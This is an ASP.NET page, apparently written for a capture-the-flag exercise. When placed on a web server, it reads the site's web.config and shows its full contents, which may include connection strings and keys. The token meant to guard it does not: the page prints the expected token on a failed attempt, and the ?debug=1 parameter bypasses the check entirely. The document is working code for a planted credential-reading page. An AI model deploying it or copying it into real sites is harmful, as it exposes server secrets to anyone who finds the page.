<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Debug: Read web.config (authorized)</title>
  <style> body { font-family:Segoe UI, Arial; margin:20px } pre { background:#f6f6f6; padding:12px; border-radius:6px; white-space:pre-wrap; } .err{color:#b33;} </style>
</head>
<body>
  <h2>Debug: Read web.config (authorized)</h2>
  <p class="err">Use only on an isolated CTF VM you control. Provide ?token=YOUR_TOKEN. Use ?debug=1 for maximum details.</p>

<%
    const string VIEW_TOKEN = "REPLACE_WITH_A_STRONG_TOKEN_ChangeMe!";
    const int MAX_BYTES = 500 * 1024; // 500 KB

    string token = Request.QueryString["token"] ?? "";
    bool debug = (Request.QueryString["debug"] == "1");
    StringBuilder outSb = new StringBuilder();

    outSb.AppendLine("Request URL: " + Request.Url.ToString());
    outSb.AppendLine("Query: " + Request.Url.Query);
    outSb.AppendLine("Client IP: " + Request.UserHostAddress);
    outSb.AppendLine("Server time (UTC): " + DateTime.UtcNow.ToString("O"));
    outSb.AppendLine();

    if (token != VIEW_TOKEN)
    {
        outSb.AppendLine("Token: MISSING or INVALID.");
        outSb.AppendLine("Provide ?token=" + VIEW_TOKEN);
        if (!debug) { Response.Write("<pre>" + HttpUtility.HtmlEncode(outSb.ToString()) + "</pre>"); return; }
    }
    else
    {
        outSb.AppendLine("Token: OK");
    }

    try
    {
        string mapped = Server.MapPath("~/");
        outSb.AppendLine("Server.MapPath(\"~/\") => " + mapped);

        string webcfg = Server.MapPath("~/web.config");
        outSb.AppendLine("Server.MapPath(\"~/web.config\") => " + webcfg);

        if (!File.Exists(webcfg))
        {
            outSb.AppendLine("File.Exists(web.config) => FALSE");
        }
        else
        {
            outSb.AppendLine("File.Exists(web.config) => TRUE");
            var fi = new FileInfo(webcfg);
            outSb.AppendLine("Size: " + fi.Length + " bytes");
            if (fi.Length > MAX_BYTES)
            {
                outSb.AppendLine("Size > MAX_BYTES, will not display content.");
            }
            else
            {
                try
                {
                    string content = File.ReadAllText(webcfg, Encoding.UTF8);
                    outSb.AppendLine("=== START web.config content ===");
                    outSb.AppendLine(content);
                    outSb.AppendLine("=== END web.config content ===");
                }
                catch (Exception rEx)
                {
                    outSb.AppendLine("Exception reading file: " + rEx.GetType().FullName + " : " + rEx.Message);
                    if (debug) outSb.AppendLine(rEx.ToString());
                }
            }
        }
    }
    catch (Exception ex)
    {
        outSb.AppendLine("Unhandled exception: " + ex.GetType().FullName + " : " + ex.Message);
        if (debug) outSb.AppendLine(ex.ToString());
    }

%>

  <pre><%= HttpUtility.HtmlEncode(outSb.ToString()) %></pre>

  <hr/>
  <p>When finished, delete this file from the server.</p>
</body>
</html>
